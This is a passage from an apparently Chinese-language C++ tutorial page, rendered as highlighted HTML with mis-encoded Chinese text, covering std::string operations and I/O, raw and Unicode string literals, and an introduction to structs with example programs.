index: &quot;</span> &lt;&lt; pos_last_l &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 12</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å­å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> sub = text.substr(<span class="number">6</span>, <span class="number">3</span>); <span class="comment">// ä»ç´¢å¼• 6 å¼€å§‹ï¼Œå– 3 ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Substring (6, 3): \&quot;&quot;</span> &lt;&lt; sub &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;C++&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¯”è¾ƒ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; s1 &lt;&lt; <span class="string">&quot;\&quot; comes before \&quot;&quot;</span> &lt;&lt; s2 &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cmp_result = s1.compare(s2); <span class="comment">// è¿”å›è´Ÿæ•°ï¼Œå› ä¸º &quot;apple&quot; &lt; &quot;apply&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Compare result: &quot;</span> &lt;&lt; cmp_result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿®æ”¹</span></span><br><span class="line">    text.insert(<span class="number">10</span>, <span class="string">&quot; beautiful&quot;</span>); <span class="comment">// åœ¨ç´¢å¼• 10 å¤„æ’å…¥</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After insert: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;Hello C++ beautiful World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.erase(<span class="number">6</span>, <span class="number">4</span>); <span class="comment">// ä»ç´¢å¼• 6 å¼€å§‹ï¼Œåˆ é™¤ 4 ä¸ªå­—ç¬¦ (&quot;C++ &quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;Hello beautiful World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.replace(<span class="number">6</span>, <span class="number">9</span>, <span class="string">&quot;gorgeous&quot;</span>); <span class="comment">// ä»ç´¢å¼• 6 å¼€å§‹ï¼Œæ›¿æ¢ 9 ä¸ªå­—ç¬¦ (&quot;beautiful&quot;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After replace: \&quot;&quot;</span> &lt;&lt; text &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;Hello gorgeous World!&quot;</span></span><br><span class="line"></span><br><span class="line">    text.clear(); <span class="comment">// æ¸…ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After clear, is empty? &quot;</span> &lt;&lt; <span class="built_in">std</span>::boolalpha &lt;&lt; text.empty() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º true</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-4-stringç±»I-O"><a href="#4-3-4-stringç±»I-O" class="headerlink" title="4.3.4 stringç±»I/O"></a>4.3.4 stringç±»I/O</h3><p>å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„è¾“å…¥è¾“å‡ºæµå¯¹è±¡ <code>cin</code> å’Œ <code>cout</code> æ¥æ–¹ä¾¿åœ°è¯»å†™ <code>string</code> å¯¹è±¡ã€‚</p><ul><li>  <strong>è¾“å‡º (<code>cout &lt;&lt;</code>):</strong> <code>&lt;&lt;</code> è¿ç®—ç¬¦è¢«é‡è½½ï¼Œå¯ä»¥ç›´æ¥å°† <code>string</code> å¯¹è±¡è¾“å‡ºåˆ° <code>cout</code>ã€‚</li><li>  <strong>è¾“å…¥ (<code>cin &gt;&gt;</code>):</strong> <code>&gt;&gt;</code> è¿ç®—ç¬¦è¢«é‡è½½ï¼Œå¯ä»¥ä» <code>cin</code> è¯»å–<strong>ä¸€ä¸ªå•è¯</strong>ï¼ˆä»¥ç©ºç™½ç¬¦â€”â€”ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦åˆ†éš”ï¼‰åˆ° <code>string</code> å¯¹è±¡ä¸­ã€‚å®ƒä¼šè‡ªåŠ¨è·³è¿‡å¼€å¤´çš„ç©ºç™½ç¬¦ï¼Œç„¶ååœ¨é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½ç¬¦æ—¶åœæ­¢è¯»å–ã€‚</li><li><strong>è¯»å–æ•´è¡Œ (<code>getline()</code>):</strong> å¦‚æœéœ€è¦è¯»å–åŒ…å«ç©ºæ ¼çš„æ•´è¡Œæ–‡æœ¬ï¼Œåº”è¯¥ä½¿ç”¨ <code>getline()</code> å‡½æ•°ï¼ˆè¿™æ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œä¸æ˜¯ <code>string</code> çš„æˆå‘˜å‡½æ•°ï¼‰ã€‚<ul><li>  <code>getline(cin, str)</code>: ä» <code>cin</code> è¯»å–ä¸€è¡Œï¼ˆç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ <code>\n</code>ï¼‰ï¼Œå¹¶å°†å†…å®¹ï¼ˆä¸åŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰å­˜å‚¨åˆ° <code>string</code> å¯¹è±¡ <code>str</code> ä¸­ã€‚</li><li>  <code>getline(cin, str, delimiter)</code>: è¯»å–ç›´åˆ°é‡åˆ°æŒ‡å®šçš„ <code>delimiter</code> å­—ç¬¦ä¸ºæ­¢ã€‚</li></ul></li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word1, word2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Enter two words:&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å…¥ (cin &gt;&gt; è¯»å–å•è¯)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word1 &gt;&gt; word2; <span class="comment">// è¾“å…¥ &quot;Hello World&quot; (ç”¨ç©ºæ ¼éš”å¼€)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 1: &quot;</span> &lt;&lt; word1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Hello</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Word 2: &quot;</span> &lt;&lt; word2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º World</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¸…é™¤è¾“å…¥ç¼“å†²åŒºä¸­å¯èƒ½æ®‹ç•™çš„æ¢è¡Œç¬¦ (cin &gt;&gt; ä¹‹åé€šå¸¸éœ€è¦)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="number">10000</span>, <span class="string">&#x27;\n&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å…¥ (getline è¯»å–æ•´è¡Œ)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a line of text: &quot;</span>;</span><br><span class="line">    getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, line); <span class="comment">// è¾“å…¥ &quot;This is a test line.&quot;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: \&quot;&quot;</span> &lt;&lt; line &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;This is a test line.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> åœ¨æ··åˆä½¿ç”¨ <code>cin &gt;&gt;</code> å’Œ <code>getline(cin, ...)</code> æ—¶è¦ç‰¹åˆ«å°å¿ƒã€‚<code>cin &gt;&gt;</code> è¯»å–å•è¯åï¼Œä¼šå°†æ¢è¡Œç¬¦ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚å¦‚æœç´§æ¥ç€è°ƒç”¨ <code>getline()</code>ï¼Œå®ƒä¼šç«‹å³è¯»åˆ°è¿™ä¸ªæ¢è¡Œç¬¦å¹¶è®¤ä¸ºè¯»å–ç»“æŸï¼Œå¯¼è‡´å¾—åˆ°ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚é€šå¸¸éœ€è¦åœ¨ <code>cin &gt;&gt;</code> ä¹‹åã€<code>getline()</code> ä¹‹å‰æ¸…é™¤ç¼“å†²åŒºä¸­çš„æ¢è¡Œç¬¦ï¼Œä¾‹å¦‚ä½¿ç”¨ <code>std::cin.ignore()</code>ã€‚</p><h3 id="4-3-5-å…¶ä»–å½¢å¼çš„å­—ç¬¦ä¸²å­—é¢å€¼"><a href="#4-3-5-å…¶ä»–å½¢å¼çš„å­—ç¬¦ä¸²å­—é¢å€¼" class="headerlink" title="4.3.5 å…¶ä»–å½¢å¼çš„å­—ç¬¦ä¸²å­—é¢å€¼"></a>4.3.5 å…¶ä»–å½¢å¼çš„å­—ç¬¦ä¸²å­—é¢å€¼</h3><p>C++11 å¼•å…¥äº†æ–°çš„å­—ç¬¦ä¸²å­—é¢å€¼å½¢å¼ï¼Œæä¾›äº†å¯¹ä¸åŒå­—ç¬¦ç¼–ç ï¼ˆå¦‚ Unicodeï¼‰çš„æ›´å¥½æ”¯æŒã€‚</p><ol><li><p><strong>åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼ (Raw String Literal):</strong></p><ul><li>  è¯­æ³•: <code>R&quot;delimiter(raw_characters)delimiter&quot;</code></li><li>  <code>delimiter</code> æ˜¯ä¸€ä¸ªå¯é€‰çš„ã€æœ€å¤š16ä¸ªå­—ç¬¦çš„åºåˆ—ï¼ˆä¸èƒ½åŒ…å«ç©ºæ ¼ã€æ‹¬å·ã€åæ–œæ ï¼‰ã€‚</li><li>  <code>raw_characters</code> æ˜¯å­—ç¬¦ä¸²å†…å®¹ï¼Œå…¶ä¸­çš„åæ–œæ  <code>\</code> å’Œå¼•å· <code>&quot;</code> ç­‰ç‰¹æ®Šå­—ç¬¦ä¸ä¼šè¢«è½¬ä¹‰ï¼ŒæŒ‰åŸæ ·è§£é‡Šã€‚</li><li>  ä¸»è¦ç”¨äºä¹¦å†™åŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå¦‚æ­£åˆ™è¡¨è¾¾å¼ã€æ–‡ä»¶è·¯å¾„ã€HTML/XMLä»£ç ç­‰ï¼Œé¿å…å¤§é‡çš„åæ–œæ è½¬ä¹‰ã€‚</li><li>  ç¤ºä¾‹: <code>R&quot;(C:\Program Files\)&quot;</code>, <code>R&quot;delimiter(String with &quot;quotes&quot; and \backslashes)delimiter&quot;</code></li></ul></li><li><p><strong>Unicode å­—ç¬¦ä¸²å­—é¢å€¼:</strong></p><ul><li>  <code>u8&quot;string&quot;</code>: UTF-8 ç¼–ç çš„å­—ç¬¦ä¸² (ç±»å‹æ˜¯ <code>const char[]</code>ï¼Œä½†åº”å­˜å‚¨åœ¨ <code>std::string</code> æˆ–å¤„ç† UTF-8 çš„åœ°æ–¹)ã€‚</li><li>  <code>u&quot;string&quot;</code>: UTF-16 ç¼–ç çš„å­—ç¬¦ä¸² (ç±»å‹æ˜¯ <code>const char16_t[]</code>)ã€‚</li><li>  <code>U&quot;string&quot;</code>: UTF-32 ç¼–ç çš„å­—ç¬¦ä¸² (ç±»å‹æ˜¯ <code>const char32_t[]</code>)ã€‚</li></ul></li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path1 = <span class="string">&quot;C:\\Program Files\\My App\\&quot;</span>; <span class="comment">// éœ€è¦è½¬ä¹‰åæ–œæ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path2 = <span class="string">R&quot;(C:\Program Files\My App\)&quot;</span>; <span class="comment">// ä½¿ç”¨åŸå§‹å­—ç¬¦ä¸²ï¼Œæ— éœ€è½¬ä¹‰</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> regex = <span class="string">R&quot;(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b)&quot;</span>; <span class="comment">// æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> html = <span class="string">R&quot;delimiter(</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;&lt;title&gt;Raw String&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;&lt;p&gt;&quot;Hello!&quot;&lt;/p&gt;&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;)delimiter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Path 1: &quot;</span> &lt;&lt; path1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Path 2: &quot;</span> &lt;&lt; path2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Regex: &quot;</span> &lt;&lt; regex &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;HTML:\n&quot;</span> &lt;&lt; html &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unicode å­—ç¬¦ä¸²å­—é¢å€¼ (ä¸»è¦ç”¨äºéœ€è¦ç‰¹å®šç¼–ç çš„åœºæ™¯)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* utf8_str = <span class="string">u8&quot;ä½ å¥½ï¼Œä¸–ç•Œ&quot;</span>; <span class="comment">// UTF-8 (éœ€è¦æ”¯æŒ UTF-8 çš„ç¯å¢ƒ/ç»ˆç«¯æ‰èƒ½æ­£ç¡®æ˜¾ç¤º)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char16_t</span>* utf16_str = <span class="string">u&quot;ä½ å¥½ï¼Œä¸–ç•Œ&quot;</span>; <span class="comment">// UTF-16</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char32_t</span>* utf32_str = <span class="string">U&quot;ä½ å¥½ï¼Œä¸–ç•Œ&quot;</span>; <span class="comment">// UTF-32</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;UTF-8 String (may not display correctly): &quot;</span> &lt;&lt; utf8_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤„ç†å’Œæ‰“å° UTF-16/32 é€šå¸¸éœ€è¦ä¸“é—¨çš„åº“æˆ–å‡½æ•°</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; utf16_str; // ä¸èƒ½ç›´æ¥ç”¨ cout æ‰“å° char16_t* / char32_t*</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸå§‹å­—ç¬¦ä¸²å­—é¢å€¼åœ¨å¤„ç†åŒ…å«ç‰¹æ®Šå­—ç¬¦çš„æ–‡æœ¬æ—¶éå¸¸æ–¹ä¾¿ã€‚Unicode å­—ç¬¦ä¸²å­—é¢å€¼åˆ™ä¸ºå¤„ç†å›½é™…åŒ–æ–‡æœ¬æä¾›äº†æ ‡å‡†åŒ–çš„åŸºç¡€ã€‚</p><h2 id="4-4-ç»“æ„ç®€ä»‹"><a href="#4-4-ç»“æ„ç®€ä»‹" class="headerlink" title="4.4 ç»“æ„ç®€ä»‹"></a>4.4 ç»“æ„ç®€ä»‹</h2><p>æ•°ç»„å…è®¸æˆ‘ä»¬å­˜å‚¨å¤šä¸ª<strong>ç›¸åŒç±»å‹</strong>çš„æ•°æ®ã€‚ä½†æœ‰æ—¶æˆ‘ä»¬éœ€è¦å°†<strong>ä¸åŒç±»å‹</strong>çš„æ•°æ®ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„ã€æœ‰æ„ä¹‰çš„å•å…ƒã€‚ä¾‹å¦‚ï¼Œæè¿°ä¸€ä»¶å•†å“å¯èƒ½éœ€è¦å•†å“åç§°ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€æ•°é‡ï¼ˆæ•´æ•°ï¼‰å’Œå•ä»·ï¼ˆæµ®ç‚¹æ•°ï¼‰ã€‚C++ çš„<strong>ç»“æ„ (Structure)</strong> å°±æä¾›äº†è¿™ç§èƒ½åŠ›ã€‚</p><p>ç»“æ„æ˜¯ä¸€ç§ç”¨æˆ·å®šä¹‰çš„<strong>å¤åˆç±»å‹</strong>ï¼Œå®ƒå…è®¸å°†å¤šä¸ªä¸åŒç±»å‹çš„æ•°æ®é¡¹ï¼ˆç§°ä¸º<strong>æˆå‘˜ (member)</strong> æˆ–**å­—æ®µ (field)**ï¼‰æ†ç»‘åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„æ•°æ®ç±»å‹ã€‚</p><h3 id="4-4-1-åœ¨ç¨‹åºä¸­ä½¿ç”¨ç»“æ„"><a href="#4-4-1-åœ¨ç¨‹åºä¸­ä½¿ç”¨ç»“æ„" class="headerlink" title="4.4.1 åœ¨ç¨‹åºä¸­ä½¿ç”¨ç»“æ„"></a>4.4.1 åœ¨ç¨‹åºä¸­ä½¿ç”¨ç»“æ„</h3><p>ä½¿ç”¨ç»“æ„é€šå¸¸æ¶‰åŠä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li> <strong>å®šä¹‰ç»“æ„:</strong> ä½¿ç”¨ <code>struct</code> å…³é”®å­—å®šä¹‰ä¸€ä¸ªæ–°çš„ç»“æ„ç±»å‹ï¼Œå¹¶åœ¨èŠ±æ‹¬å· <code>&#123;&#125;</code> å†…å£°æ˜å…¶æˆå‘˜ã€‚ç»“æ„å®šä¹‰é€šå¸¸æ”¾åœ¨ <code>main()</code> å‡½æ•°ä¹‹å‰æˆ–å•ç‹¬çš„å¤´æ–‡ä»¶ä¸­ã€‚</li><li> <strong>å£°æ˜ç»“æ„å˜é‡:</strong> ä½¿ç”¨å®šä¹‰å¥½çš„ç»“æ„ç±»å‹åæ¥å£°æ˜å˜é‡ã€‚</li><li> <strong>è®¿é—®ç»“æ„æˆå‘˜:</strong> ä½¿ç”¨<strong>æˆå‘˜è¿ç®—ç¬¦</strong>ï¼ˆç‚¹è¿ç®—ç¬¦ <code>.</code>) æ¥è®¿é—®ç»“æ„å˜é‡çš„ç‰¹å®šæˆå‘˜ã€‚</li></ol><p><strong>ç»“æ„å®šä¹‰è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StructureName</span> &#123;</span></span><br><span class="line">    memberType1 memberName1;</span><br><span class="line">    memberType2 memberName2;</span><br><span class="line">    <span class="comment">// ... more members</span></span><br><span class="line">&#125;; <span class="comment">// æ³¨æ„å®šä¹‰æœ«å°¾çš„åˆ†å·</span></span><br></pre></td></tr></table></figure><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // ä¸ºäº†ä½¿ç”¨ string</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. å®šä¹‰ç»“æ„: æè¿°å……æ°”äº§å“çš„ç»“æ„ä½“</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Inflatable</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// å•†å“åç§° (string ç±»å‹æˆå‘˜)</span></span><br><span class="line">    <span class="keyword">float</span> volume;     <span class="comment">// ä½“ç§¯ (float ç±»å‹æˆå‘˜)</span></span><br><span class="line">    <span class="keyword">double</span> price;     <span class="comment">// ä»·æ ¼ (double ç±»å‹æˆå‘˜)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 2. å£°æ˜ç»“æ„å˜é‡</span></span><br><span class="line">    Inflatable product1; <span class="comment">// å£°æ˜ä¸€ä¸ª Inflatable ç±»å‹çš„å˜é‡ product1</span></span><br><span class="line">    Inflatable product2; <span class="comment">// å£°æ˜å¦ä¸€ä¸ª Inflatable ç±»å‹çš„å˜é‡ product2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è®¿é—®å¹¶èµ‹å€¼ç»“æ„æˆå‘˜</span></span><br><span class="line">    product1.name = <span class="string">&quot;Awesome Air Mattress&quot;</span>;</span><br><span class="line">    product1.volume = <span class="number">1.8f</span>;</span><br><span class="line">    product1.price = <span class="number">49.99</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥åœ¨å£°æ˜æ—¶è¿›è¡Œåˆå§‹åŒ– (C++98/03 é£æ ¼ï¼Œéœ€è¦æŒ‰é¡ºåº)</span></span><br><span class="line">    Inflatable product3 = &#123;<span class="string">&quot;Giant Swan Floatie&quot;</span>, <span class="number">2.5f</span>, <span class="number">79.95</span>&#125;; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å¹¶è¾“å‡ºæˆå‘˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 1 Name: &quot;</span> &lt;&lt; product1.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 1 Price: $&quot;</span> &lt;&lt; product1.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 3 Name: &quot;</span> &lt;&lt; product3.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 3 Volume: &quot;</span> &lt;&lt; product3.volume &lt;&lt; <span class="string">&quot; cubic meters&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»“æ„å˜é‡ä¹‹é—´å¯ä»¥ç›´æ¥èµ‹å€¼ (æˆå‘˜é€ä¸ªå¤åˆ¶)</span></span><br><span class="line">    product2 = product1; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product 2 Name (after assignment): &quot;</span> &lt;&lt; product2.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>struct Inflatable &#123; ... &#125;;</code>: å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>Inflatable</code> çš„æ–°ç±»å‹ã€‚</li><li>  <code>Inflatable product1;</code>: åˆ›å»ºäº†ä¸€ä¸ª <code>Inflatable</code> ç±»å‹çš„å˜é‡ï¼ˆå¯¹è±¡ï¼‰ã€‚</li><li>  <code>product1.name = ...;</code>: ä½¿ç”¨ç‚¹è¿ç®—ç¬¦è®¿é—® <code>product1</code> çš„ <code>name</code> 